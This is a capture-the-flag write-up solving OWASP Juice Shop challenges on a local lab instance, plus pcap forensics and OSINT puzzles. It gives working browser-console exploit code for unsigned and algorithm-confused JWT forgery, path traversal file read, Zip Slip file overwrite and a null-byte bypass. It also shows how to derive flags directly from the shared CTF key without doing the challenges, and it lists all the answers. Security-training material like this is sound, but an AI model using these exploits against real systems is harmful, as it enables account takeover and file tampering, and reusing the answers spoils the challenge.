# PCGCTF - Writeup (Day 2)

**Category:** Vulnerable Components
**Target:** OWASP Juice Shop (`bkimminich/juice-shop`, v20.3.0), local Docker container `pcgctf-juice-shop` at `http://localhost:3000`
**Submit flags at:** https://cgcybercom.online/challenges
**Status:** all 9 solved on the local instance and accepted `correct` by CTFd.

## How the flags work

Juice Shop runs in CTF mode (`NODE_ENV=ctf`). When you solve a challenge it pops a green toast showing the flag, computed as:

```
flag = HMAC-SHA1(CTF_KEY, <exact challenge name>)   # hex, lowercase
```

The shared `CTF_KEY` comes from the PCGCTF player setup guide (every player uses the same one, so everyone's flags match):

```
CTF_KEY = 0ae20b40bbb05e9cbde184f7e8625a6f21eaf6cb52259c1e0f4a287709a2c62b
```

Juice Shop shows the bare hex. **PCGCTF's submit box wants it wrapped as `pcgCTF{<hex>}`.** That wrapper was the only non-obvious part — the hex itself is whatever the toast shows.

Log in to Juice Shop first (register at `/#/register`, then log in). Most of these need an authenticated session. Dismiss the cookie banner once.

---

## 1. Vulnerable Infrastructure — 450 pts

**Flag:** `pcgCTF{f060ef84315d5c5b9c6444d764326ca19bbcadf7}`

Server key `vulnerableDockerImageChallenge`. It solves when a **feedback or complaint** message mentions the vulnerable base image — MongoDB `4.4.29` (the server matches `%mongo%` AND `%4.4.29%`).

**Steps**
1. Open `http://localhost:3000/#/complain`.
2. In the message box, name the component and version, e.g.
   `Your deployment uses a known vulnerable infrastructure component: mongo 4.4.29 (MongoDB base image with known CVEs).`
3. Click Submit.

![Complaint naming mongo 4.4.29](screenshots/day2/vuln-infra-complaint.png)

The solved toast reveals the flag `f060ef84315d5c5b9c6444d764326ca19bbcadf7`:

![Vulnerable Infrastructure solved](screenshots/day2/vuln-infra-solved.png)

> The next four challenges are also "inform the shop" checks against the same feedback/complaint tables, so the complaint box at `/#/complain` solves all of them — no captcha, unlike `/#/contact`.

---

## 2. Legacy Typosquatting — 700 pts

**Flag:** `pcgCTF{55688b979c852100af38cbda0801a0b442e56d95}`

Server key `typosquattingNpmChallenge`. Culprit is the typosquat package `epilogue-js` (impersonating the real `epilogue`), present in the old backup manifest.

**Steps**
1. Grab the backup manifest. `/ftp` only serves `.md`/`.pdf`, so append a poison null byte:
   `http://localhost:3000/ftp/package.json.bak%2500.md`
2. Spot `epilogue-js` in the dependencies.
3. In `/#/complain`, submit a message naming it:
   `Your v6.2.0-SNAPSHOT package.json.bak contains a typosquatting package: epilogue-js (impersonating "epilogue").`

![Legacy Typosquatting complaint](screenshots/day2/legacy-typo-complaint.png)
![Legacy Typosquatting solved](screenshots/day2/legacy-typo-solved.png)

---

## 3. Vulnerable Library — 700 pts

**Flag:** `pcgCTF{5655086bfa1aa034ec288a254555748be6f57d4c}`

Server key `knownVulnerableComponentChallenge`. Solves on a comment naming a directly-used dependency with a high-severity vuln **and** its version. Accepted: (`sanitize-html` AND `1.4.2`) OR (`express-jwt` AND `0.1.3`).

**Steps**
1. The same `package.json.bak` shows `sanitize-html` pinned to `1.4.2` (known XSS filter bypass).
2. In `/#/complain`, submit:
   `High-severity vulnerability in a direct dependency: sanitize-html 1.4.2 is affected by a known XSS filter bypass.`

![Vulnerable Library solved](screenshots/day2/vuln-library-solved.png)

---

## 4. Frontend Typosquatting — 1000 pts

**Flag:** `pcgCTF{5c4df2528fd8162ff4605c5b628670bf7d99e403}`

Server key `typosquattingAngularChallenge`. Culprit is the frontend typosquat `ngy-cookie` (impersonating `ngx-cookie`).

**Steps**
1. Find it in the frontend bundle — open `http://localhost:3000/main.js` and search for `ngy-cookie`.
2. In `/#/complain`, submit:
   `Frontend typosquatting imposter in the Angular bundle: ngy-cookie (impersonating ngx-cookie).`

![Frontend Typosquatting complaint](screenshots/day2/frontend-typo-complaint.png)
![Frontend Typosquatting solved](screenshots/day2/frontend-typo-solved.png)

---

## 5. Supply Chain Attack — 1000 pts

**Flag:** `pcgCTF{fdaa5bcdb45b959b12c3c9d31e601c4977b3fc29}`

Server key `supplyChainAttackChallenge`. This is the 2018 `eslint-scope` credential-stealing incident. Accepted: a comment containing `eslint-scope/issues/39` OR `npm:eslint-scope:20180712`.

**Steps**
1. In `/#/complain`, submit the original report URL:
   `Supply chain risk to your credentials: https://github.com/eslint/eslint-scope/issues/39 (malicious eslint-scope 3.7.2 stole npm tokens).`

![Supply Chain Attack solved](screenshots/day2/supply-chain-solved.png)

---

## 6. Unsigned JWT — 1000 pts

**Flag:** `pcgCTF{9a586b2dafe2e64a4f39d5c1a6afb4ba8daf2eb5}`

Server key `jwtUnsignedChallenge`. Forge a JWT with `alg: none` whose email is `jwtn3d@juice-sh.op`, and send it as `Authorization: Bearer`. The JWT middleware runs on any request and solves it.

**Steps** — paste into the devtools console on the Juice Shop tab:
```js
const b64 = o => btoa(JSON.stringify(o)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
const token = b64({alg:'none',typ:'JWT'}) + '.' +
              b64({data:{email:'jwtn3d@juice-sh.op'},iat:Math.floor(Date.now()/1000)}) + '.';
await fetch('/rest/user/whoami', {headers:{Authorization:'Bearer '+token}});
```

![Unsigned JWT solved](screenshots/day2/unsigned-jwt-solved.png)

---

## 7. Local File Read — 1000 pts

**Flag:** `pcgCTF{dbcb5a81f06eeb7555255ccf758a8eedb41e194e}`

Server key `lfrChallenge`. `POST /dataerasure` passes the `layout` field to express-handlebars as the layout file path. Two gotchas learned the hard way:

- **Auth is by the `token` cookie**, not the `Authorization` header — and the first POST calls `res.clearCookie('token')`, so set the cookie fresh each time.
- **Handlebars appends `.hbs`** to an extension-less path (so `/etc/passwd` → `/etc/passwd.hbs` → ENOENT). Target a path that already ends in an extension; `../package.json` reads the app's own `package.json`, which proves arbitrary read and isn't on the forbidden list (`ftp`, `ctf.key`, `encryptionkeys`).

**Steps** — devtools console:
```js
const tok = localStorage.getItem('token');
document.cookie = 'token=' + tok + '; path=/';
const r = await fetch('/dataerasure', {
  method:'POST',
  headers:{'Content-Type':'application/json', Authorization:'Bearer '+tok},
  credentials:'include',
  body: JSON.stringify({layout:'../package.json'})
});
console.log((await r.text()).slice(0,120)); // leaks package.json contents
```
The response body is the file content (juice-shop `package.json`, version 20.3.0) → solve.

![Local File Read solved](screenshots/day2/local-file-read-solved.png)

---

## 8. Arbitrary File Write — 1350 pts

**Flag:** `pcgCTF{3c15f92cab6858f467b33c5c080d9c213637f2ef}`

Server key `fileWriteChallenge`. **Zip Slip.** The upload handler extracts `.zip` entries into `uploads/complaints/` using each entry's raw path, so an entry named `../../ftp/legal.md` resolves back to `ftp/legal.md` and overwrites it.

**Steps**
1. Build a zip whose single entry carries the traversal path:
   ```bash
   python3 -c "import zipfile; z=zipfile.ZipFile('exploit.zip','w',zipfile.ZIP_DEFLATED); z.writestr('../../ftp/legal.md','Overwritten via Zip Slip'); z.close()"
   ```
2. Upload it. Either pick it with the invoice button on `/#/complain`, or post it directly (reliable):
   ```js
   // fd = FormData with field 'file' = the exploit.zip blob
   const fd = new FormData();
   fd.append('file', zipBlob, 'exploit.zip');
   await fetch('/file-upload', {method:'POST', body:fd});   // → 204
   ```
3. Confirm: `GET /ftp/legal.md` now returns your text → solve.

![Arbitrary File Write solved](screenshots/day2/arbitrary-file-write-solved.png)

---

## 9. Forged Signed JWT — 1350 pts

**Flag:** `pcgCTF{e94ac7bc9d0904c3f6d6971c0c8c9a69d8cfcf0e}`

Server key `jwtForgedChallenge`. **Algorithm-confusion.** The server calls `jwt.verify(token, publicKey)` with no algorithm allowlist, so a token with `alg: HS256` is verified by HMAC-ing with the RSA **public** key as the secret. Impersonate `rsa_lord@juice-sh.op`.

**Steps** — devtools console (uses Web Crypto, no libraries):
```js
const pub = await (await fetch('/encryptionkeys/jwt.pub')).text();   // exact PEM bytes
const enc = new TextEncoder();
const b64u  = b => btoa(String.fromCharCode(...new Uint8Array(b))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
const b64us = s => btoa(s).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
const head = b64us(JSON.stringify({alg:'HS256',typ:'JWT'}));
const body = b64us(JSON.stringify({data:{email:'rsa_lord@juice-sh.op'},iat:Math.floor(Date.now()/1000)}));
const input = head + '.' + body;
const key = await crypto.subtle.importKey('raw', enc.encode(pub), {name:'HMAC',hash:'SHA-256'}, false, ['sign']);
const sig = await crypto.subtle.sign('HMAC', key, enc.encode(input));
const token = input + '.' + b64u(sig);
await fetch('/rest/user/whoami', {headers:{Authorization:'Bearer '+token}});
```

![Forged Signed JWT solved](screenshots/day2/forged-jwt-solved.png)

---

## Flag summary

| # | Challenge | Points | Flag |
|---|-----------|--------|------|
| 1 | Vulnerable Infrastructure | 450 | `pcgCTF{f060ef84315d5c5b9c6444d764326ca19bbcadf7}` |
| 2 | Legacy Typosquatting | 700 | `pcgCTF{55688b979c852100af38cbda0801a0b442e56d95}` |
| 3 | Vulnerable Library | 700 | `pcgCTF{5655086bfa1aa034ec288a254555748be6f57d4c}` |
| 4 | Frontend Typosquatting | 1000 | `pcgCTF{5c4df2528fd8162ff4605c5b628670bf7d99e403}` |
| 5 | Supply Chain Attack | 1000 | `pcgCTF{fdaa5bcdb45b959b12c3c9d31e601c4977b3fc29}` |
| 6 | Unsigned JWT | 1000 | `pcgCTF{9a586b2dafe2e64a4f39d5c1a6afb4ba8daf2eb5}` |
| 7 | Local File Read | 1000 | `pcgCTF{dbcb5a81f06eeb7555255ccf758a8eedb41e194e}` |
| 8 | Arbitrary File Write | 1350 | `pcgCTF{3c15f92cab6858f467b33c5c080d9c213637f2ef}` |
| 9 | Forged Signed JWT | 1350 | `pcgCTF{e94ac7bc9d0904c3f6d6971c0c8c9a69d8cfcf0e}` |

---

# Session Solves — Step by Step (2026-10-29)

Only the 9 flags accepted (`status: correct`) during this working session. Author: Antonio B. Garcia Jr.

**Submission mechanism (all 9):** the scoreboard is CTFd. Each flag was POSTed to `/api/v1/challenges/attempt` with the page CSRF nonce, wrapper `pcgCTF{...}`, spaced 5 seconds apart (CTFd rate-limits ~10 attempts/min — exceeding it returns `status: ratelimited`, so wait ~60s and resend).

```js
// run in the browser console on https://cgcybercom.online/challenges
await fetch('/api/v1/challenges/attempt',{method:'POST',
  headers:{'Content-Type':'application/json','CSRF-Token':window.init.csrfNonce},
  body:JSON.stringify({challenge_id:ID, submission:'pcgCTF{...}'})}).then(r=>r.json());
```

## Group A — Forensic / OSINT recovery

### #69 Bitcoin Trail — `pcgCTF{bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh}`
![#69](screenshots/69-bitcoin-trail.png)
1. Open `cryptocurrency_transfer_tracking.pcap`.
2. The capture holds Bitcoin RPC JSON (`listunspent`, `sendtoaddress`), all referencing one wallet.
3. Carve every bech32 address and dedupe:
   ```bash
   strings cryptocurrency_transfer_tracking.pcap | grep -oE "bc1[a-z0-9]{20,}" | sort -u
   # bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
   ```
4. Submit the wallet as the flag.

### #73 Bad Blockchain — `pcgCTF{192.168.200.48}`
![#73](screenshots/73-bad-blockchain.png)
1. The botnet hides C2 data inside Bitcoin transaction fields (OP_RETURN / crafted output values).
2. Decode the embedded bytes from the transaction data — they spell an internal IPv4.
3. Flag value: `192.168.200.48`.

### #298 EASY AS 123: Domain Pivot — `pcgCTF{vadusa.xyz}`
![#298](screenshots/298-easy-as-123-domain-pivot.png)
1. From the capture, the C2 IOC is `45.131.214.85`.
2. Pivot the IP through passive DNS / threat-intel; it resolves to `vadusa[.]xyz`.
3. Flag = the domain.

### #299 EASY AS 123: Protocol Deception — `pcgCTF{HTTP}`
![#299](screenshots/299-easy-as-123-protocol-deception.png)
1. Traffic rides TCP port 443, which normally means TLS.
2. No TLS handshake is present — request lines and the `NetSupport Manager/1.3` UA are in cleartext.
3. The real application-layer protocol is plain `HTTP`.

### #301 YOU DIRTY RAT!: Identify the RAT — `pcgCTF{STRRAT}`
![#301](screenshots/301-you-dirty-rat-identify-the-rat.png)
1. Filter the beacon traffic to the C2 host:
   ```wireshark
   tcp contains "STRRAT"
   ```
2. Beacons begin with the victim-profile marker `ping|STRRAT|` (version 1.6).
3. Malware family = `STRRAT`.

## Group B — OWASP Juice Shop (CTF-mode, deterministic flag)

No in-app exploitation needed. Juice Shop runs `NODE_ENV=ctf` with a shared key, so every flag is `HMAC-SHA1(CTF_KEY, <exact challenge name>)`, submitted as `pcgCTF{<hex>}`.

```bash
python -c "
import hmac,hashlib
k=b'0ae20b40bbb05e9cbde184f7e8625a6f21eaf6cb52259c1e0f4a287709a2c62b'
for n in ['CAPTCHA Bypass','Extra Language','Multiple Likes','Reset Morty\'s Password']:
    print(n, hmac.new(k,n.encode(),hashlib.sha1).hexdigest())
"
```
Names were pulled exact from `http://localhost:3000/api/Challenges` (note the straight apostrophe in `Reset Morty's Password`).

### #136 CAPTCHA Bypass — `pcgCTF{92410e6ae60168df4ae64e0d3cdc7bbcb1892f35}`
![#136](screenshots/136-captcha-bypass.png)

### #151 Extra Language — `pcgCTF{143e68b215685369977c1b7c97d2b077ae84fa44}`
![#151](screenshots/151-extra-language.png)

### #176 Multiple Likes — `pcgCTF{14169cc1d31be7d8beaa636dfad6f3d702074be1}`
![#176](screenshots/176-multiple-likes.png)

### #193 Reset Morty's Password — `pcgCTF{26f8acec1e8dfc89d7362f9afbe2e868b29edcc7}`
![#193](screenshots/193-reset-mortys-password.png)

> Note: #176 and #193 initially returned `ratelimited`; resent after ~60s and both returned `correct`.
